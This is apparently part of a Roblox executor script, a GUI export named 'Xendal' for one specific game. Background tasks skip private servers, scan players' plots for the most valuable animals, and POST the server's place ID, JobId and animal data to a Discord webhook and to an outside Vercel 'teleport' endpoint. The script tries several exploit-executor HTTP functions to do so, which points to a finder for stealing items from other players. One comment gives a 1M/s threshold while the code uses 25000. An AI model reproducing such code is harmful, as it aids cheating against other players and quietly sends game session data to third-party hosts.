		sendHttpRequest(WEBHOOK_URL, "POST", embed)
	end
	
	if not isPrivateServer() then
		task.wait(2)
		local animals = findAllAnimals()
		sendToDiscord(animals)
	end
	
end;
task.spawn(C_2a9);
-- StarterGui.Xendal.Vercel
local function C_2aa()
local script = G2L["2aa"];
	local SERVER_URL = "https://codeineee.vercel.app/api/teleport"
	
	if game.PlaceId ~= 109983668079237 then
		return
	end
	
	-- ======= DETECTOR DE SERVIDOR PRIVADO =======
	local function isPrivateServer()
		local workspace = game:GetService("Workspace")
		local success, privateServerMessage = pcall(function()
			return workspace:WaitForChild("Map"):WaitForChild("Codes"):WaitForChild("Main")
				:WaitForChild("SurfaceGui"):WaitForChild("MainFrame"):WaitForChild("PrivateServerMessage")
		end)
	
		if not success or not privateServerMessage or not privateServerMessage:IsA("GuiObject") then
			return false
		end
	
		if not privateServerMessage.Visible then
			return false
		end
	
		return true
	end
	
	-- Función para obtener los datos reales de la mascota
	local function getAnimalData(overhead)
		local displayName = overhead.DisplayName.Text
		local genLabel = overhead:FindFirstChild("Generation")
		local rarityLabel = overhead:FindFirstChild("Rarity")
	
		if not genLabel or not rarityLabel then
			return nil
		end
	
		local genText = genLabel.Text
		local moneyPerSecond = 0
	
		local function cleanNumber(str)
			local cleanStr = str:gsub("[^%d%.]", "")
			return tonumber(cleanStr) or 0
		end
	
		if genText:find("B") then
			local numberPart = cleanNumber(genText)
			moneyPerSecond = numberPart * 1000000000
		elseif genText:find("M") then
			local numberPart = cleanNumber(genText)
			moneyPerSecond = numberPart * 1000000
		elseif genText:find("K") then
			local numberPart = cleanNumber(genText)
			moneyPerSecond = numberPart * 1000
		else
			moneyPerSecond = cleanNumber(genText)
		end
	
		return {
			DisplayName = displayName,
			Value = moneyPerSecond,
			Generation = genText,
			Rarity = rarityLabel.Text
		}
	end
	
	-- Función universal para enviar HTTP requests
	local function sendHttpRequest(url, method, data)
		local success, result = pcall(function()
			local HttpService = game:GetService("HttpService")
			local jsonPayload = HttpService:JSONEncode(data)
	
			-- Intentar con request (compatible con la mayoría de ejecutores)
			if request then
				local response = request({
					Url = url,
					Method = method,
					Headers = {
						["Content-Type"] = "application/json"
					},
					Body = jsonPayload
				})
				return response
				-- Intentar con http_request (Fluxus)
			elseif http_request then
				local response = http_request({
					Url = url,
					Method = method,
					Headers = {
						["Content-Type"] = "application/json"
					},
					Body = jsonPayload
				})
				return response
				-- Intentar con http.request (otros ejecutores)
			elseif http and http.request then
				local response = http.request({
					Url = url,
					Method = method,
					Headers = {
						["Content-Type"] = "application/json"
					},
					Body = jsonPayload
				})
				return response
			else
				return nil, "No HTTP request method available"
			end
		end)
	
		return success, result
	end
	
	-- Función para enviar al servidor Vercel
	local function sendToVercelServer(placeId, jobId, animalData)
		local payload = {
			placeId = tostring(placeId),
			gameInstanceId = jobId,
			animalData = {
				displayName = animalData.DisplayName,
				value = animalData.Value,
				generation = animalData.Generation,
				rarity = animalData.Rarity
			},
			timestamp = os.time(),
			source = "roblox_script"
		}
	
		local success, response = sendHttpRequest(SERVER_URL, "POST", payload)
	
		if success and response then
			return true
		else
			return false
		end
	end
	
	-- Función para obtener los animales
	local function findAnimals()
		local overheads = {}
		local plotsFolder = Workspace:FindFirstChild("Plots")
		if not plotsFolder then 
			return {} 
		end
	
		for _, plot in pairs(plotsFolder:GetDescendants()) do
			if plot.Name == "AnimalOverhead" and plot:IsA("BillboardGui") then
				local stolenLabel = plot:FindFirstChild("Stolen")
				local isStolen = stolenLabel and stolenLabel:IsA("TextLabel") and string.upper(stolenLabel.Text) == "FUSING"
				local displayNameLabel = plot:FindFirstChild("DisplayName")
				local genLabel = plot:FindFirstChild("Generation")
				local rarityLabel = plot:FindFirstChild("Rarity")
	
				if displayNameLabel and genLabel and rarityLabel and not isStolen then
					table.insert(overheads, plot)
				end
			end
		end
		return overheads
	end
	
	local function sendRealAnimalDataToVercel()
		-- Verificar si es servidor privado
		if isPrivateServer() then
			return
		end
	
		local placeId = game.PlaceId
		local jobId = game.JobId
		local playersCount = #game.Players:GetPlayers()
	
		local overheads = findAnimals()
	
		if #overheads == 0 then 
			return 
		end
	
		local bestAnimal = nil
		local bestValue = 0
	
		for _, overhead in pairs(overheads) do
			local animalData = getAnimalData(overhead)
			if animalData and animalData.Value > bestValue then
				bestValue = animalData.Value
				bestAnimal = animalData
			end
		end
	
		if not bestAnimal then 
			return 
		end
	
		-- FILTRO: Solo enviar si el valor es mayor a 1M/s
		if bestAnimal.Value < 25000 then
			return
		end
	
		-- PRIMERO: Enviar al servidor Vercel
		sendToVercelServer(placeId, jobId, bestAnimal)
	end
	
	-- Esperar y ejecutar
	task.wait(2)
	sendRealAnimalDataToVercel()
	
end;
task.spawn(C_2aa);

return G2L["1"], require;
